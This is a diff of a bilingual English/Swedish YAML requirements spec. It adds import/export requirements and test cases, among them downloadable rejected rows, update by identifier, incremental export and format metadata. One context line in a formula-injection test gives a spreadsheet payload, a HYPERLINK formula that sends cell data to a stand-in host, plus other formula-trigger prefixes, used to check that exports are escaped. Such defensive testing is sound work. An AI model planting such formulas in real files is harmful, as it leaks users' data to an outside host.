@@ -251,6 +251,102 @@ requirements:
         - method: test
           text: Objekt vars titlar börjar med vart och ett av de sex tecknen exporteras med en inledande apostrof och öppnas som text i ett kalkylprogram.
 
+  - id: IMEX-12
+    type: functional
+    obligation: must
+    priority: medium
+    tags: [rejected-rows, error-file, import]
+    refs: ["ISO/IEC 25012:2008 completeness", "ISO 9241-110:2020 use error robustness"]
+    tests: [IMEX-T09]
+    en:
+      title: Rejected rows as a downloadable file
+      description: After an import, the system MUST offer the rejected rows as a file in the original format with a column that states the reason for each row.
+      rationale: Correcting rejections in the source file and importing only those rows again is much quicker than reading an error list and searching for each row.
+      criteria:
+        - method: test
+          text: An import with 3 invalid rows of 100 gives a file with exactly those 3 rows and a reason for each.
+          threshold: "1 reason per rejected row"
+    sv:
+      title: Avvisade rader som nedladdningsbar fil
+      description: Efter en import SKA systemet erbjuda de avvisade raderna som en fil i originalformatet med en kolumn som anger skälet för varje rad.
+      rationale: Att rätta avvisningar i källfilen och bara importera de raderna igen går mycket fortare än att läsa en fellista och leta upp varje rad.
+      criteria:
+        - method: test
+          text: En import med 3 ogiltiga rader av 100 ger en fil med exakt de 3 raderna och ett skäl för var och en.
+          threshold: "1 skäl per avvisad rad"
+
+  - id: IMEX-13
+    type: functional
+    obligation: should
+    priority: medium
+    tags: [update, identifiers, duplicates]
+    refs: ["ISO/IEC 25012:2008 consistency", "ISO 8000-8:2015 (information and data quality)"]
+    tests: [IMEX-T10]
+    en:
+      title: Import updates existing items by identifier
+      description: An import SHOULD update the existing item when a row carries the identifier of an item already in the project, instead of creating a duplicate.
+      rationale: Teams edit exported data in spreadsheets and bring it back, and an import that only creates turns each round trip into duplicates.
+      criteria:
+        - method: test
+          text: Importing 10 rows with existing identifiers changes those 10 items and creates no new ones.
+          threshold: "0 duplicates created"
+    sv:
+      title: Import uppdaterar befintliga objekt via identitet
+      description: En import BÖR uppdatera det befintliga objektet när en rad bär identiteten för ett objekt som redan finns i projektet, i stället för att skapa en dubblett.
+      rationale: Team redigerar exporterade data i kalkylblad och för tillbaka dem, och en import som bara skapar gör varje rundtur till dubbletter.
+      criteria:
+        - method: test
+          text: Att importera 10 rader med befintliga identiteter ändrar de 10 objekten och skapar inga nya.
+          threshold: "0 dubbletter skapas"
+
+  - id: IMEX-14
+    type: interface
+    obligation: should
+    priority: medium
+    tags: [incremental, export, synchronisation]
+    refs: ["ISO/IEC 25010:2023 interoperability", "RFC 3339"]
+    tests: [IMEX-T11]
+    en:
+      title: Incremental export of changes
+      description: The system SHOULD export only the items changed since a given time, including a list of items deleted since then.
+      rationale: Data warehouses and other systems that copy the data every night cannot afford a full export each time.
+      criteria:
+        - method: test
+          text: An export since a given time contains exactly the 5 items changed and the 1 item deleted after that time.
+          threshold: "only changes after the given time"
+    sv:
+      title: Stegvis export av ändringar
+      description: Systemet BÖR exportera bara de objekt som har ändrats sedan en angiven tidpunkt, med en lista över objekt som har raderats sedan dess.
+      rationale: Datalager och andra system som kopierar data varje natt har inte råd med en fullständig export varje gång.
+      criteria:
+        - method: test
+          text: En export sedan en angiven tidpunkt innehåller exakt de 5 objekt som ändrades och det 1 objekt som raderades efter den tidpunkten.
+          threshold: "bara ändringar efter angiven tidpunkt"
+
+  - id: IMEX-15
+    type: interface
+    obligation: must
+    priority: medium
+    tags: [format-version, metadata, export]
+    refs: ["ISO/IEC 25010:2023 interoperability", "Semantic Versioning"]
+    tests: [IMEX-T12]
+    en:
+      title: Format version and time in each export
+      description: Each export file MUST state the version of its format, the time of the export and the version of the system that produced it.
+      rationale: A file read years later or by another system can only be interpreted correctly if it says which format and which system produced it.
+      criteria:
+        - method: inspection
+          text: JSON, CSV and Excel exports each contain the format version, export time and system version in a header or metadata field.
+          threshold: "3 of 3 formats"
+    sv:
+      title: Formatversion och tidpunkt i varje export
+      description: Varje exportfil SKA ange version av sitt format, tidpunkten för exporten och versionen av det system som skapade den.
+      rationale: En fil som läses flera år senare eller av ett annat system kan bara tolkas rätt om den talar om vilket format och vilket system som skapade den.
+      criteria:
+        - method: inspection
+          text: Exporter i JSON, CSV och Excel innehåller var och en formatversion, exporttidpunkt och systemversion i ett huvud eller metadatafält.
+          threshold: "3 av 3 format"
+
 tests:
   - id: IMEX-T01
     priority: high
@@ -491,3 +587,127 @@ tests:
           data: '=HYPERLINK("http://example.test?x="&A1), +SUM(1), -1+1, @cmd, \tTab, \rCR'
         - action: Exportera samma objekt till Excel och läs celltyperna.
           expected: Varje titelcell har typen text och innehåller ingen formel.
+
+  - id: IMEX-T09
+    priority: medium
+    execution: manual
+    tags: [rejected-rows, error-file]
+    refs: ["ISO 9241-110:2020 use error robustness"]
+    en:
+      title: Download of rejected rows
+      description: Imports a file with some invalid rows and downloads the rejected rows.
+      preconditions: A CSV file with 100 rows, of which 3 have invalid values.
+      expected: The downloaded file has the 3 rows with a reason each and can be fixed and imported again.
+      steps:
+        - action: Import the file and accept the import of the valid rows.
+          expected: 97 rows are imported and 3 are reported as rejected.
+          data: "rows 12, 45 and 88 have an invalid date"
+        - action: Download the rejected rows.
+          expected: The CSV file contains the 3 rows with the original columns and a reason column.
+        - action: Correct the dates in the file and import it.
+          expected: The 3 rows are imported.
+    sv:
+      title: Nedladdning av avvisade rader
+      description: Importerar en fil med några ogiltiga rader och laddar ned de avvisade raderna.
+      preconditions: En CSV-fil med 100 rader, varav 3 har ogiltiga värden.
+      expected: Den nedladdade filen har de 3 raderna med ett skäl var och kan rättas och importeras igen.
+      steps:
+        - action: Importera filen och godkänn import av de giltiga raderna.
+          expected: 97 rader importeras och 3 rapporteras som avvisade.
+          data: "rad 12, 45 och 88 har ett ogiltigt datum"
+        - action: Ladda ned de avvisade raderna.
+          expected: CSV-filen innehåller de 3 raderna med de ursprungliga kolumnerna och en kolumn med skäl.
+        - action: Rätta datumen i filen och importera den.
+          expected: De 3 raderna importeras.
+
+  - id: IMEX-T10
+    priority: medium
+    execution: manual
+    tags: [update, identifiers]
+    refs: ["ISO/IEC 25012:2008 consistency"]
+    en:
+      title: Re-import of edited exported items
+      description: Exports items, edits them in a spreadsheet and imports the file again.
+      preconditions: A project with at least 10 items.
+      expected: The 10 items are updated and no new item is created.
+      steps:
+        - action: Export 10 items to Excel.
+          expected: The file contains the identifiers.
+          data: "items REQ-1 to REQ-10"
+        - action: Change the title of each item in the file and import it.
+          expected: The validation report lists 10 updates and 0 new items.
+        - action: Count the items in the project.
+          expected: The count is unchanged and the titles are updated.
+    sv:
+      title: Återimport av redigerade exporterade objekt
+      description: Exporterar objekt, redigerar dem i ett kalkylblad och importerar filen igen.
+      preconditions: Ett projekt med minst 10 objekt.
+      expected: De 10 objekten uppdateras och inget nytt objekt skapas.
+      steps:
+        - action: Exportera 10 objekt till Excel.
+          expected: Filen innehåller identiteterna.
+          data: "objekten REQ-1 till REQ-10"
+        - action: Ändra titeln på varje objekt i filen och importera den.
+          expected: Valideringsrapporten listar 10 uppdateringar och 0 nya objekt.
+        - action: Räkna objekten i projektet.
+          expected: Antalet är oförändrat och titlarna är uppdaterade.
+
+  - id: IMEX-T11
+    priority: medium
+    execution: automated
+    tags: [incremental, export]
+    refs: ["RFC 3339"]
+    en:
+      title: Export of changes since a time
+      description: Changes and deletes items after a recorded time and exports the changes.
+      preconditions: A project with items and API access to the export.
+      expected: The export contains exactly the changed and deleted items.
+      steps:
+        - action: Record the current time, then edit 5 items and delete 1.
+          expected: The changes are saved.
+          data: "time recorded as 2026-11-21T10:00:00Z"
+        - action: Request the export of changes since the recorded time.
+          expected: The export lists the 5 changed items and names the deleted item.
+        - action: Request the export since a time after the changes.
+          expected: The export is empty.
+    sv:
+      title: Export av ändringar sedan en tidpunkt
+      description: Ändrar och raderar objekt efter en noterad tidpunkt och exporterar ändringarna.
+      preconditions: Ett projekt med objekt och API-åtkomst till exporten.
+      expected: Exporten innehåller exakt de ändrade och raderade objekten.
+      steps:
+        - action: Notera aktuell tid, redigera sedan 5 objekt och radera 1.
+          expected: Ändringarna sparas.
+          data: "tidpunkt noterad som 2026-11-21T10:00:00Z"
+        - action: Begär export av ändringar sedan den noterade tidpunkten.
+          expected: Exporten listar de 5 ändrade objekten och anger det raderade objektet.
+        - action: Begär exporten sedan en tidpunkt efter ändringarna.
+          expected: Exporten är tom.
+
+  - id: IMEX-T12
+    priority: medium
+    execution: manual
+    tags: [format-version, metadata]
+    refs: ["ISO/IEC 25010:2023 interoperability"]
+    en:
+      title: Export metadata in each format
+      description: Exports the same data in three formats and looks for the metadata.
+      preconditions: A project with items and the system version known.
+      expected: Each export states format version, export time and system version.
+      steps:
+        - action: Export to JSON and read the top-level metadata.
+          expected: Format version, export time and system version are present.
+        - action: Export to CSV and Excel and look at the header rows or document properties.
+          expected: The same three values are present in both.
+          data: "Excel document properties"
+    sv:
+      title: Exportmetadata i varje format
+      description: Exporterar samma data i tre format och letar efter metadata.
+      preconditions: Ett projekt med objekt och känd systemversion.
+      expected: Varje export anger formatversion, exporttidpunkt och systemversion.
+      steps:
+        - action: Exportera till JSON och läs metadata på översta nivån.
+          expected: Formatversion, exporttidpunkt och systemversion finns.
+        - action: Exportera till CSV och Excel och titta på huvudraderna eller dokumentegenskaperna.
+          expected: Samma tre värden finns i båda.
+          data: "dokumentegenskaper i Excel"
